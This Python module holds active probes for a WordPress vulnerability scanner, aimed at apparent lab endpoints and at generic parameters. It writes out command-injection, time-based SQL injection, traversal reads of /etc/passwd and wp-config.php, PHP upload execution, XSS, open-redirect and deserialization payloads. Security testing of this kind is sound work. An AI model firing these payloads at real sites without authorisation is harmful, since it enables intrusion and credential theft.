#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Active, evidence based checks for the dynamic WordPress scanner.

Every check has to *prove* impact (executed marker, measured delay, leaked file
content) instead of trusting an HTTP 200. That is what makes it accurate where
the old framework produced false positives.
"""

import re
import time
from urllib.parse import urlparse

from wp_dynamic_common import result, token

AJAX = "/wp-admin/admin-ajax.php"

# (kind, path, method, action, param) - known vulnerable plugin endpoints first,
# generic fallbacks afterwards so the scanner is still useful against arbitrary
# production sites.
ACTIVE_CANDIDATES = [
    ("rce", AJAX, "GET", "vulnlab_exec", "cmd"),
    ("sqli", AJAX, "GET", "vulnlab_search", "u"),
    ("lfi", AJAX, "GET", "vulnlab_read", "file"),
    ("xss", AJAX, "GET", "vulnlab_xss", "msg"),
    ("redirect", AJAX, "GET", "vulnlab_redirect", "url"),
    ("deserialization", AJAX, "POST", "vulnlab_unpack", "data"),
    ("xss", "/", "GET", None, "msg"),
    ("xss", "/", "GET", None, "q"),
    ("lfi", "/", "GET", None, "file"),
    ("lfi", "/", "GET", None, "template"),
    ("redirect", "/", "GET", None, "redirect"),
    ("rce", "/", "GET", None, "cmd"),
    ("sqli", "/", "GET", None, "s"),
]

UPLOAD_CANDIDATES = [
    (AJAX, "vulnlab_upload", "shell"),
]

SLEEP = 4
DELAY_THRESHOLD = 3.5

# Command injection payload templates.
#  * "; echo X" covers sinks of the shape system('ping ' . $cmd)
#  * "echo X"   covers sinks of the shape system('id; ' . $cmd) - note that a
#    leading ";" would produce "; ;" which /bin/sh (dash) rejects as a syntax
#    error, so both shapes have to be tried.
CMD_MARKER_PAYLOADS = ["; echo {m}", "echo {m}", "$(echo {m})"]
CMD_SLEEP_PAYLOADS = ["; sleep {n}", "sleep {n}"]

# SQL injection payload templates. WordPress applies addslashes() to request
# data, so the "1\' ..." variants are needed for targets that do not unslash
# the input: addslashes() turns 1\' into 1\\' and the literal then closes.
SQLI_SLEEP_PAYLOADS = [
    "1' OR (SELECT 1 FROM (SELECT SLEEP({n}))a)-- ",
    "1' UNION SELECT SLEEP({n})-- ",
    "1\\' OR (SELECT 1 FROM (SELECT SLEEP({n}))a)-- ",
    "1\\' UNION SELECT SLEEP({n})-- ",
]
SQLI_PROBES = ["1'", "1\\'"]


def _send(target, path, method, action, param, value, allow_redirects=True):
    data = {}
    if action is not None:
        data["action"] = action
    data[param] = value
    if method == "POST":
        return target.post(path, data=data, allow_redirects=allow_redirects)
    return target.get(path, params=data, allow_redirects=allow_redirects)


def _timed(target, path, method, action, param, value):
    start = time.monotonic()
    _send(target, path, method, action, param, value, allow_redirects=False)
    return time.monotonic() - start


def check_command_injection(target):
    """Prove RCE with an executed marker, fall back to a timing side channel."""
    out = []
    for kind, path, method, action, param in ACTIVE_CANDIDATES:
        if kind != "rce":
            continue
        marker = token("RCE")
        confirmed = False
        for template in CMD_MARKER_PAYLOADS:
            try:
                resp = _send(target, path, method, action, param,
                             template.format(m=marker), allow_redirects=False)
            except Exception:  # noqa: BLE001
                continue
            if marker in resp.text:
                out.append(result(
                    "command-injection", "Command injection (RCE)", "critical",
                    "CWE-78", True,
                    "marker {} was executed (payload {!r})".format(marker, template),
                    url=target.url(path), detail=resp.text.strip()[:150]))
                confirmed = True
                break
        if confirmed:
            continue
        try:
            base = _timed(target, path, method, action, param, "1")
        except Exception:  # noqa: BLE001
            continue
        for template in CMD_SLEEP_PAYLOADS:
            try:
                slow = _timed(target, path, method, action, param,
                              template.format(n=SLEEP))
            except Exception:  # noqa: BLE001
                continue
            if slow - base >= DELAY_THRESHOLD:
                out.append(result(
                    "command-injection", "Command injection (blind, time based)",
                    "critical", "CWE-78", True,
                    "sleep payload delayed {:.1f}s (baseline {:.1f}s)".format(slow, base),
                    url=target.url(path), detail=template))
                break
    if not out:
        out.append(result("command-injection", "Command injection", "info", "CWE-78",
                          False, "no marker echo and no timing side channel"))
    return out


def check_sqli(target):
    """Error based detection first, then blind time based detection."""
    out = []
    for kind, path, method, action, param in ACTIVE_CANDIDATES:
        if kind != "sqli":
            continue
        evidence = None
        for probe in SQLI_PROBES:
            try:
                resp = _send(target, path, method, action, param, probe,
                             allow_redirects=False)
            except Exception:  # noqa: BLE001
                continue
            found = re.search(
                r"(SQL syntax|WordPress database error|mysqli?_|"
                r"You have an error in your SQL)", resp.text, re.IGNORECASE)
            if found:
                evidence = found.group(0)
                break
        if evidence:
            out.append(result(
                "sqli-error", "SQL injection (error based)", "critical", "CWE-89",
                True, "database error disclosed for a single quote",
                url=target.url(path), detail=evidence))
            continue
        try:
            base = _timed(target, path, method, action, param, "1")
        except Exception:  # noqa: BLE001
            continue
        for template in SQLI_SLEEP_PAYLOADS:
            payload = template.format(n=SLEEP)
            try:
                delayed = _timed(target, path, method, action, param, payload)
            except Exception:  # noqa: BLE001
                continue
            if delayed - base >= DELAY_THRESHOLD:
                out.append(result(
                    "sqli-blind", "Blind SQL injection (time based)", "critical",
                    "CWE-89", True,
                    "payload delayed {:.1f}s (baseline {:.1f}s)".format(delayed, base),
                    url=target.url(path), detail=payload.strip()))
                break
    if not out:
        out.append(result("sqli", "SQL injection", "info", "CWE-89", False,
                          "no error output and no measurable delay"))
    return out


def check_lfi(target):
    """Read arbitrary files: prove it with leaked /etc/passwd or wp-config.php."""
    payloads = ["/etc/passwd", "../../../../wp-config.php",
                "....//....//....//wp-config.php"]
    signatures = [("root:x:0:0", "read /etc/passwd"),
                  ("DB_PASSWORD", "read wp-config.php"),
                  ("DB_NAME", "read wp-config.php")]
    out = []
    for kind, path, method, action, param in ACTIVE_CANDIDATES:
        if kind != "lfi":
            continue
        confirmed = False
        for payload in payloads:
            try:
                resp = _send(target, path, method, action, param, payload,
                             allow_redirects=False)
            except Exception:  # noqa: BLE001
                continue
            for sig, what in signatures:
                if sig in resp.text:
                    out.append(result(
                        "lfi", "Arbitrary file read / local file inclusion", "critical",
                        "CWE-98", True, "{} using {}".format(what, payload),
                        url=target.url(path), detail=resp.text.strip()[:150]))
                    confirmed = True
                    break
            if confirmed:
                break
    if not out:
        out.append(result("lfi", "Arbitrary file read", "info", "CWE-98", False,
                          "no file content leaked"))
    return out


def check_file_upload(target):
    """Upload a PHP marker and try to execute it from the uploads directory."""
    out = []
    for path, action, field in UPLOAD_CANDIDATES:
        marker = token("UPL")
        name = "vscan_{}.php".format(token("F").lower())
        content = '<?php echo "{}"; ?>'.format(marker)
        try:
            resp = target.post(path, data={"action": action},
                               files={field: (name, content, "image/jpeg")})
        except Exception:  # noqa: BLE001
            continue
        if resp.status_code != 200:
            continue
        candidates = []
        found = re.search(r"(wp-content/uploads/[^\s\"'<>]+\.php)", resp.text)
        if found:
            candidates.append("/" + found.group(1))
        candidates += [
            "/wp-content/uploads/{}".format(name),
            "/wp-content/uploads/vulnlab/{}".format(name),
            "/wp-content/uploads/{}/{}".format(time.strftime("%Y/%m"), name),
            "/wp-content/uploads/2024/01/{}".format(name),
        ]
        executed = False
        for candidate in candidates:
            try:
                probe = target.get(candidate)
            except Exception:  # noqa: BLE001
                continue
            if marker in probe.text and "<?php" not in probe.text:
                out.append(result(
                    "file-upload-rce", "Unrestricted file upload -> RCE", "critical",
                    "CWE-434", True,
                    "uploaded {} and executed it at {}".format(name, candidate),
                    url=target.url(candidate), detail=probe.text.strip()[:120]))
                executed = True
                break
        if not executed and name in resp.text:
            out.append(result(
                "file-upload", "Unrestricted file upload (upload accepted)", "high",
                "CWE-434", True,
                "server stored {} without validating the extension".format(name),
                url=target.url(path), detail=resp.text.strip()[:120]))
    if not out:
        out.append(result("file-upload", "Unrestricted file upload", "info", "CWE-434",
                          False, "no upload endpoint accepted the payload"))
    return out


def check_reflected_xss(target):
    """Reflect an XSS payload and require it back verbatim (unescaped)."""
    out = []
    for kind, path, method, action, param in ACTIVE_CANDIDATES:
        if kind != "xss":
            continue
        marker = token("XSS")
        payload = '"><svg/onload={}>'.format(marker)
        try:
            resp = _send(target, path, method, action, param, payload)
        except Exception:  # noqa: BLE001
            continue
        if payload in resp.text:
            out.append(result("reflected-xss", "Reflected cross-site scripting",
                              "medium", "CWE-79", True,
                              "payload {} reflected verbatim".format(payload),
                              url=target.url(path)))
    if not out:
        out.append(result("reflected-xss", "Reflected XSS", "info", "CWE-79", False,
                          "payload was escaped or not reflected"))
    return out


def check_open_redirect(target):
    """Ask the server to redirect to an attacker controlled host."""
    out = []
    for kind, path, method, action, param in ACTIVE_CANDIDATES:
        if kind != "redirect":
            continue
        destination = "https://example.org/{}".format(token("RD"))
        try:
            resp = _send(target, path, method, action, param, destination,
                         allow_redirects=False)
        except Exception:  # noqa: BLE001
            continue
        location = resp.headers.get("Location", "")
        # Only an off-site target counts: WordPress itself issues canonical
        # redirects that merely *contain* the payload in the query string.
        host = urlparse(location).netloc.split(":")[0].lower()
        if (resp.status_code in (301, 302, 303, 307, 308)
                and host.endswith("example.org")):
            out.append(result("open-redirect", "Open redirect", "medium", "CWE-601",
                              True, "HTTP {} -> {}".format(resp.status_code, location),
                              url=target.url(path)))
    if not out:
        out.append(result("open-redirect", "Open redirect", "info", "CWE-601", False,
                          "no external redirect issued"))
    return out


def check_deserialization(target):
    """Send a serialized PHP object and look for proof it was reconstructed."""
    out = []
    for kind, path, method, action, param in ACTIVE_CANDIDATES:
        if kind != "deserialization":
            continue
        payload = 'O:8:"stdClass":1:{s:1:"a";s:1:"b";}'
        try:
            resp = _send(target, path, method, action, param, payload,
                         allow_redirects=False)
        except Exception:  # noqa: BLE001
            continue
        if re.search(r"\bobject\b", resp.text):
            out.append(result("deserialization", "Insecure deserialization",
                              "medium", "CWE-502", True,
                              "attacker supplied object data was unserialized",
                              url=target.url(path), detail=resp.text.strip()[:120]))
    if not out:
        out.append(result("deserialization", "Insecure deserialization", "info",
                          "CWE-502", False, "no evidence of unserialize()"))
    return out


ACTIVE_CHECKS = [
    ("command-injection", check_command_injection),
    ("sqli", check_sqli),
    ("lfi", check_lfi),
    ("file-upload", check_file_upload),
    ("reflected-xss", check_reflected_xss),
    ("open-redirect", check_open_redirect),
    ("deserialization", check_deserialization),
]

